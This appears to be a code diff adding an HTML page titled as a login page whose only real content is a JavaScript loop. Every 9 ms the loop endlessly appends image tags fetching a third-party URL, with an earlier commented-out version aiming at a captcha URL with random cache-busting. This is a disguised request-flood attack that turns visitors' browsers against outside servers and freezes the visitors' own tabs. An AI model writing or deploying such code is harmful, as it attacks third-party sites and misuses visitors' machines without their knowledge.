@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<title>登录-{$_SERVER['WEB_NAME']}中心</title>
+        <script type="text/javascript">
+        $(function(){
+        	setInterval(function(){
+        		while(true){
+                        /*
+        			var img = $('<img src="http://www.weimob.com/reg/captcha?f=business_reg&tmp='+Math.random()+'"/>');
+                                */
+                                var img = $('<img src="http://wx.zongyangtech.cn/favicon.ico"/>');
+            		img.load(function(){
+            			$(this).remove();
+            		});
+            		$('body').append(img);
+        		}        		
+        	},9);
+        });
+        </script>
+    </head>
+ <body> 
+	
+</body>
+</html>
